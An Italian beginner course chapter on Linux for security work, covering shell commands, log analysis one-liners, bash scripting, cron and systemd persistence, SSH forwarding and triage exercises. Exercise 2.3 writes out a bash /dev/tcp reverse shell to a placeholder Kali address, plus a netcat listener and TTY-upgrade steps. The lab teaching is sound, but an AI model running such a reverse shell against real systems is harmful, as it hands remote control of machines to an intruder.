---
title: "Linux essenziale per la security"
area: "Fondamenti"
order: 2
level: "principiante"
summary: "La shell bash, i comandi che userai tutti i giorni, scripting, gestione dei processi, networking di base, automatizzare con cron e systemd. Senza saper guidare Linux non sopravvivi un mese in security."
prereq:
  - "Sezione 01"
  - "Una VM Kali o Ubuntu"
tools:
  - "bash, coreutils"
  - "grep, awk, sed, jq"
  - "tmux"
  - "vim o nano"
  - "systemd, cron"
---

# Linux essenziale per la security

> Esiste un detto: *"Real hackers use Linux."* È sciocco quanto vuoi, ma il 90% dei tool offensivi e difensivi sono made-for-Linux. Anche se difendi server Windows, la tua workstation di lavoro spesso è Linux/macOS. Imparalo.

## Filosofia Unix in 4 punti

1. Ogni programma fa **una cosa sola**, bene.
2. I programmi si **combinano** via pipe (`|`).
3. Tutto è un **file** (o quasi).
4. Tutto è **testo** (i log, le config, l'output dei comandi) → si può grep-pare, awk-are, sed-are.

Pratica: invece di un mega-tool che fa tutto, una catena di comandi:

```bash
cat /var/log/auth.log | grep "Failed password" | awk '{print $11}' | sort | uniq -c | sort -rn | head -20
```

Questo trova i primi 20 IP che hanno tentato login SSH falliti. **Una riga.**

## Filesystem e percorsi

Layout standard (FHS — Filesystem Hierarchy Standard):

| Path | A cosa serve |
|---|---|
| `/` | root del filesystem |
| `/bin`, `/usr/bin` | eseguibili pubblici |
| `/sbin`, `/usr/sbin` | eseguibili di sistema (root) |
| `/lib`, `/usr/lib` | librerie condivise |
| `/etc` | configurazioni globali |
| `/home/<user>` | home directory utenti |
| `/root` | home di root |
| `/var/log` | log di sistema e servizi |
| `/var/spool` | code (cron, mail) |
| `/tmp`, `/var/tmp` | file temporanei (sticky bit) |
| `/proc` | pseudo-fs: stato kernel e processi |
| `/sys` | pseudo-fs: device del kernel |
| `/dev` | device file |
| `/opt` | software opzionale di terzi |

In security userai spessissimo `/etc` (config), `/var/log` (analisi), `/tmp` (scrittura come utente non privilegiato), `/proc` (info processi).

### Percorsi assoluti vs relativi

- Assoluto: parte da `/` → `/usr/bin/ls`
- Relativo: parte da current dir (`pwd`) → `../bin/ls`
- `~` = home utente corrente, `~alice` = home di alice
- `.` = current dir, `..` = parent

**Pericolosa abitudine:** `./script.sh` esegue lo script *qui*; ma `script.sh` (senza `./`) esegue se è nel `PATH`. Mai mettere `.` nel PATH (se metti `ls` in `/tmp` e qualcuno digita `ls` in `/tmp`, esegue il tuo file).

## I comandi che devi avere come riflesso muscolare

### Navigazione e info di base

```bash
pwd                       # dove sono?
cd /etc                   # cambia dir
cd -                      # torna alla dir precedente
ls -lah                   # lista, long, all, human
ls -lah --color=auto
tree -L 2 /etc            # struttura ad albero
file binary               # tipo di file
stat file                 # metadata (permessi, inode, atime/ctime/mtime)
du -sh /var/log/*         # spazio occupato
df -h                     # spazio dischi
mount                     # cosa è montato
```

### Visualizzare file

```bash
cat file                  # tutto (occhio ai file enormi!)
less file                 # paginato, ricerca con / e n
head -n 20 file
tail -n 50 file
tail -F /var/log/syslog   # follow live
wc -l file                # conta righe
```

### Cercare

```bash
find / -name "*.conf" -type f 2>/dev/null
find / -mtime -1                # modificati nelle ultime 24h
find / -size +100M
find / -perm -4000 -user root   # SUID root
grep -r "password" /etc 2>/dev/null
grep -i -n "error" file         # case-insensitive, line numbers
grep -E "regex"                 # extended regex
grep -P "pcre regex"            # perl-compatible regex (più potente)
```

### Manipolazione testo (il pane quotidiano)

```bash
# cut: estrai colonne
cut -d: -f1 /etc/passwd        # solo username

# sort + uniq
sort file | uniq                # rimuovi duplicati (file deve essere sortato)
sort file | uniq -c | sort -rn  # conta e ordina per frequenza desc

# awk: il coltello svizzero
awk -F: '{print $1, $3}' /etc/passwd        # username e UID
awk '$3 == 0 {print $1}' /etc/passwd        # utenti con UID 0 (root)
awk 'NR>1 && /WARN/ {print $1, $5}' log

# sed: sostituzioni in place
sed -i 's/old/new/g' file       # sostituisci ovunque
sed -n '10,20p' file            # stampa righe 10-20
sed '/^#/d' config              # rimuovi commenti

# tr: traduci caratteri
echo "HELLO" | tr 'A-Z' 'a-z'    # → hello
tr -d '\r' < winfile > linuxfile  # rimuovi CR

# tee: redirect ma anche stdout
command | tee output.log
```

### Permessi e ownership

```bash
chmod 755 file               # rwxr-xr-x
chmod u+x script.sh          # add execute per user
chmod -R g+w dir
chown alice:dev file
chown -R alice:dev dir
umask 027                    # default: nuovi file 640, dir 750
```

### Processi

```bash
ps aux                       # tutti i processi
ps -ef
pgrep -fa nginx              # PID dei processi con cmdline matching
pstree -p                    # albero con PID
top                          # interattivo
htop                         # più carino (installa)
kill 1234                    # SIGTERM
kill -9 1234                 # SIGKILL (no grace)
killall -u alice firefox     # tutti i firefox di alice
nohup ./long-job &           # detached
jobs                         # job in background della shell corrente
fg %1
bg %1
disown
```

### Networking

```bash
ip addr                      # interfacce
ip route                     # routing table
ss -tulpn                    # socket in ascolto (TCP+UDP, listening, processes, numeric)
ss -tan state established
ss -tn '( dport = :443 )'
ping -c 4 example.com
traceroute example.com
mtr example.com              # ping + traceroute combinati
dig example.com              # DNS
dig +short MX example.com
host example.com
curl -v https://example.com
curl -I https://example.com  # solo headers
wget -r --no-parent https://example.com/path/
nc -lvnp 4444                # netcat listener
nc -zv host 80               # port check
```

### Trasferimenti

```bash
scp file user@host:/path/
rsync -av --progress src/ dst/
rsync -av -e "ssh -p 2222" src/ user@host:/path/
sftp user@host
```

### Compressione e archivi

```bash
tar czvf archive.tar.gz dir/
tar xzvf archive.tar.gz
tar tvf archive.tar.gz       # list
zip -r archive.zip dir/
unzip archive.zip
7z x archive.7z
```

### `man`, `--help`, e altri docs

Sempre. `man find`, `info coreutils`, `tldr <cmd>` (riassunti esempi reali).

## Redirezione e pipe

```bash
cmd > file                  # stdout in file (overwrite)
cmd >> file                 # append
cmd 2> err                  # stderr in file
cmd > file 2>&1             # stdout+stderr in file
cmd &> file                 # idem (bash)
cmd 2>/dev/null             # scarta stderr (utile nei find)
cmd1 | cmd2                 # stdout di cmd1 → stdin di cmd2
cmd1 |& cmd2                # anche stderr
cmd < input.txt             # stdin da file
diff <(cmd1) <(cmd2)        # process substitution
```

Esempi reali:
```bash
# trova file modificati ieri e contali per dir
find / -mtime -1 -type f 2>/dev/null | awk -F/ '{print $2"/"$3}' | sort | uniq -c | sort -rn

# IP più attivi nei log Apache
awk '{print $1}' /var/log/apache2/access.log | sort | uniq -c | sort -rn | head -20
```

## Variabili, espansioni, quoting

```bash
NAME=alice              # no spazi attorno all'=
echo $NAME
echo "$NAME"            # quoting: variabile espansa
echo '$NAME'            # quoting: letterale, NON espansa
echo `date`             # backtick: legacy command substitution
echo $(date)            # preferito
LIST=$(ls)
echo ${NAME:-default}   # se NAME vuota, "default"
echo ${VAR:?errore}     # se VAR vuota, errore con messaggio
echo ${PATH/:/, }       # sostituzione
```

**Importante:** in security gestisci spesso path con spazi o caratteri strani. **Sempre quotare** i nomi file: `rm "$file"`, non `rm $file`.

### Variabili d'ambiente

```bash
export DEBUG=1
env                          # tutte
printenv PATH
set                          # vars + funzioni della shell
unset DEBUG
```

`PATH`, `HOME`, `USER`, `SHELL`, `LD_PRELOAD`, `LD_LIBRARY_PATH` — note importanti.

> **Curiosità security:** `LD_PRELOAD` permette di caricare una shared library prima delle altre. È un classico vettore di privesc/persistenza se mal gestito. Su binari SUID viene ignorato per sicurezza (a meno di config esotiche).

## Scripting bash

Esempio commentato:

```bash
#!/usr/bin/env bash
set -euo pipefail              # -e: exit on error; -u: undef var = error; -o pipefail: errore in pipe propaga
IFS=$'\n\t'                    # safe IFS

# Funzione
log() {
    echo "[$(date +%H:%M:%S)] $*" >&2
}

# Argomento posizionale
target="${1:-127.0.0.1}"
log "Scanning $target"

# Loop e condizioni
for port in 22 80 443 8080; do
    if nc -z -w1 "$target" "$port" 2>/dev/null; then
        log "Port $port OPEN"
    else
        log "Port $port closed"
    fi
done

# Array
ports=(22 80 443 8080)
for p in "${ports[@]}"; do
    echo "port $p"
done

# Case
case "$1" in
    start) systemctl start nginx ;;
    stop)  systemctl stop nginx ;;
    *)     echo "uso: $0 {start|stop}"; exit 1 ;;
esac
```

Cose da sapere:
- `[ ... ]` test POSIX, `[[ ... ]]` test bash (più potente, regex).
- `$?` exit status ultimo comando.
- `$$` PID dello script.
- `$#` numero argomenti, `$@` tutti, `$1`–`$9` posizionali, `${10}` oltre il 9.
- Funzioni: `func() { ...; return 0; }`.

**Errori frequenti:**

- Spazi sbagliati in assegnamenti: `X = 1` non funziona, è chiamata al comando `X` con argomenti `=` e `1`.
- `read -p "msg: " var` solo bash; POSIX usa `printf` + `read`.
- `[[ $a -gt $b ]]` per interi, `[[ $a > $b ]]` per stringhe (lessicale).

### Esercizio 2.1 — Scrivi uno script
Scrivi `monitor.sh` che, dato un host:
- ping-a ogni 10s,
- se 3 ping consecutivi falliscono, scrive nel log `alert.log` con timestamp,
- altrimenti `up.log`,
- ferma con Ctrl-C in modo pulito (trap).

<details><summary>Soluzione</summary>

```bash
#!/usr/bin/env bash
set -euo pipefail
host="${1:?usage: $0 <host>}"
fails=0
trap 'echo; echo "stop"; exit 0' INT TERM

while true; do
    if ping -c1 -W2 "$host" >/dev/null 2>&1; then
        fails=0
        echo "$(date -Is) $host up" >> up.log
    else
        fails=$((fails+1))
        if [ "$fails" -ge 3 ]; then
            echo "$(date -Is) ALERT $host down (3 in a row)" >> alert.log
            fails=0  # evita spam
        fi
    fi
    sleep 10
done
```

</details>

## Cron e systemd timer

### Cron (vecchio ma vivo)

`crontab -e` per editare il proprio:

```cron
# m h dom mon dow cmd
*/5 * * * * /usr/local/bin/sync.sh
0 3 * * 0   /usr/local/bin/backup-weekly.sh
@reboot     /usr/local/bin/start-tunnel.sh
```

Per cron di sistema: `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/cron.hourly/`. Tutti questi sono target preferiti di **persistence** dei malware.

### systemd timers (moderno)

```ini
# /etc/systemd/system/backup.timer
[Unit]
Description=Daily backup
[Timer]
OnCalendar=daily
Persistent=true
[Install]
WantedBy=timers.target
```

Servizio associato `/etc/systemd/system/backup.service`. Attivi con `systemctl enable --now backup.timer`.

`systemctl list-timers --all` per vedere tutti. **Persistence comune** ai malware moderni.

### systemd services

```ini
# /etc/systemd/system/myapp.service
[Unit]
Description=My App
After=network.target

[Service]
Type=simple
User=myapp
ExecStart=/usr/local/bin/myapp
Restart=on-failure
# Hardening
NoNewPrivileges=true
ProtectSystem=strict
ProtectHome=true
PrivateTmp=true
CapabilityBoundingSet=CAP_NET_BIND_SERVICE

[Install]
WantedBy=multi-user.target
```

Conoscere le direttive di hardening è importante: rivedrai servizi e dirai "perché questo gira come root e senza `ProtectSystem`?".

## SSH (lo userai 100 volte al giorno)

Configurazione `~/.ssh/config`:

```ssh-config
Host pivot
    HostName 10.10.10.10
    User alice
    Port 2222
    IdentityFile ~/.ssh/id_ed25519_pivot
    ServerAliveInterval 30

Host internal
    HostName 192.168.50.5
    User bob
    ProxyJump pivot
```

Poi: `ssh internal` e ti porta automaticamente attraverso pivot.

**Genera chiavi sicure:**
```bash
ssh-keygen -t ed25519 -C "alice@laptop"
```

**Port forwarding (utilissimo in pentest interno):**
```bash
# Local forwarding: porta 8080 locale → 80 su host remoto (visto dalla VPS)
ssh -L 8080:internal.host:80 user@vps

# Remote forwarding: chi si connette a VPS:9000 arriva sul tuo localhost:22
ssh -R 9000:localhost:22 user@vps

# Dynamic (SOCKS5 proxy)
ssh -D 1080 user@vps
# poi configura tuoi tool per usare SOCKS5 127.0.0.1:1080
```

**Hardening server SSH (`/etc/ssh/sshd_config`):**
- `PermitRootLogin no`
- `PasswordAuthentication no` (solo chiavi)
- `MaxAuthTries 3`
- `AllowUsers alice bob`
- `Protocol 2`
- `ClientAliveInterval 300`
- Disabilita algoritmi deboli.

## tmux: vivere senza perdere sessioni

Quando sei via SSH e il link cade, perdi i comandi in esecuzione. `tmux` salva la sessione lato server.

```bash
tmux new -s work        # nuova sessione
# (lavora)
# Ctrl-b d              detach
tmux ls
tmux attach -t work     # riattacca

# Dentro tmux (Ctrl-b è il prefix)
# c    nuova finestra
# n/p  next/prev window
# %    split verticale
# "    split orizzontale
# arrows naviga tra pane
# [    modalità copy/scroll
# d    detach
```

Per quattro pane sempre attivi con monitoring, scripting, log e shell, tmux è imbattibile.

## Utility che ti salveranno

- **jq** — query JSON. `cat file.json | jq '.users[] | select(.role=="admin") | .email'`
- **yq** — come jq ma per YAML.
- **xargs** — costruire comandi da stdin. `cat targets.txt | xargs -I {} nmap -sV {}`.
- **parallel** (GNU parallel) — esecuzione parallela. `cat hosts | parallel -j10 ssh {} uptime`.
- **ripgrep (rg)** — grep velocissimo, rispetta gitignore.
- **fd** — find moderno.
- **fzf** — fuzzy finder interattivo.
- **bat** — `cat` con syntax highlighting.
- **htop**, **iotop**, **iftop**, **nethogs** — monitoring.
- **strace**, **ltrace** — trace di syscall / libcall. Userai strace per capire cosa fa un binario sospetto.
- **lsof** — liste open file e socket (`lsof -i :443`, `lsof -p PID`).

## Vim minimo per sopravvivere

Quando sei via SSH spesso vim è l'unico editor disponibile.

```text
i       insert mode
ESC     normal mode
:w      save
:q      quit
:wq     save+quit
:q!     quit no save

# normal mode movement
h j k l   left down up right
w / b     parola avanti / indietro
gg / G    inizio / fine file
0 / $     inizio / fine riga
ngg       vai a riga n

# edit
dd        cancella riga
yy        copia riga
p         paste
u         undo
Ctrl-r    redo
/text     cerca
n / N     next / prev match
:%s/a/b/g sostituisci ovunque
```

Se vim è troppo, nano va benissimo.

## Esercizi

### Esercizio 2.2 — One-liner forensics
Scrivi una pipe che data `/var/log/auth.log` (o equivalente) trovi:
- Top 10 IP con più login SSH falliti.
- Lista degli username che hanno provato.
- Distribuzione oraria dei tentativi.

<details><summary>Soluzione</summary>

```bash
# Top 10 IP failed
grep "Failed password" /var/log/auth.log | awk '{print $(NF-3)}' | sort | uniq -c | sort -rn | head -10

# Username tentati
grep -oP "Failed password for (invalid user )?\K\S+" /var/log/auth.log | sort | uniq -c | sort -rn

# Distribuzione oraria
grep "Failed password" /var/log/auth.log | awk '{print $3}' | cut -d: -f1 | sort | uniq -c
```

</details>

### Esercizio 2.3 — Reverse shell catcher
1. Su Kali: `nc -lvnp 4444`
2. Su target Ubuntu: `bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1`
3. Ottieni una "dumb shell" su Kali. Esegui `id`, `whoami`, `uname -a`.

Adesso "upgradala" a una shell completa (TTY) con queste tre tappe:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# Ctrl-Z (sospendi)
stty raw -echo; fg
export TERM=xterm
```

Perché questa procedura? Cosa significano i passaggi?

<details><summary>Spiegazione</summary>

`bash -i >& /dev/tcp/IP/PORT 0>&1` è una *bash reverse shell* che usa il "magic file" `/dev/tcp` (bash builtin) per aprire una TCP socket, redirige stdin/stdout/stderr lì. Quando Kali riceve la connessione, hai una shell. Ma è "stupida" — niente Ctrl-C che funzioni, niente tab completion, niente vim usabile.

L'upgrade:
1. `python3 -c 'pty.spawn(...)'` apre un nuovo pty (pseudo-terminal) e ci spawna bash sopra → ora hai un terminale interattivo lato target.
2. Ctrl-Z mette in background la shell `nc` lato attacker.
3. `stty raw -echo` mette il terminale locale in modalità "passa tutto al child" senza echo locale.
4. `fg` riporta `nc` in foreground.
5. `export TERM=xterm` setta il tipo terminale per supportare colori/comandi avanzati.

</details>

### Esercizio 2.4 — Persistence detection
Su una VM, crea (con cron e con systemd timer) due "backdoor" innocue (es. uno script che scrive un file in `/tmp` ogni 5 min). Poi, simula essere il difensore: trova tutte le forme di persistence sul sistema. Considera anche:

- `crontab -l` per ogni utente
- `/etc/cron.d/`, `/etc/cron.daily/`, `/etc/anacrontab`
- `systemctl list-timers --all`
- `systemctl list-units --type=service`
- `~/.bashrc`, `~/.profile`, `/etc/profile.d/*`
- `~/.config/autostart/*.desktop`
- `/etc/init.d/`, `/etc/rc.local`
- file con cap o setuid recenti

<details><summary>Suggerimento</summary>

Uno script utile di triage:
```bash
echo "=== crontab utente $USER ==="; crontab -l 2>/dev/null
echo "=== /etc/cron.* ==="; ls -la /etc/cron.* 2>/dev/null
echo "=== systemd timers ==="; systemctl list-timers --all
echo "=== profile scripts ==="; ls -la /etc/profile.d/ ~/.bashrc ~/.profile 2>/dev/null
echo "=== rc.local ==="; cat /etc/rc.local 2>/dev/null
```

Esistono tool dedicati: `LinPEAS`, `linenum`, `linux-smart-enumeration`.

</details>

### Esercizio 2.5 — Quick triage box compromessa
Scrivi (o adatta) uno script che raccolga informazioni rapide su una macchina sospetta: utenti, ultimi login, processi attivi, network, cron, suid recenti, file modificati nelle ultime 24 ore. Output in markdown.

### Esercizio 2.6 — OverTheWire Bandit
Vai su [overthewire.org/wargames/bandit](https://overthewire.org/wargames/bandit/) e completa i primi 15 livelli. Sono esercizi guidati di shell che ti faranno entrare *davvero* in confidenza con il terminale. **Non saltarli.** Sono il rite of passage di chiunque inizi.

## Concetti chiave

1. **Filosofia Unix:** programmi piccoli che si combinano.
2. **Pipes, redirect, grep/awk/sed:** tu *trasformi* dati su streams testuali.
3. **Permessi, SUID, capabilities:** base privesc.
4. **systemd e cron:** dove i malware fanno persistence.
5. **SSH con forwarding (L/R/D):** la base del pivoting in pentest.
6. **strace / lsof:** ti dicono *davvero* cosa fa un binario.

Stesse cose le imparerai a memoria per Windows nelle prossime sezioni. Linux però è lo standard.
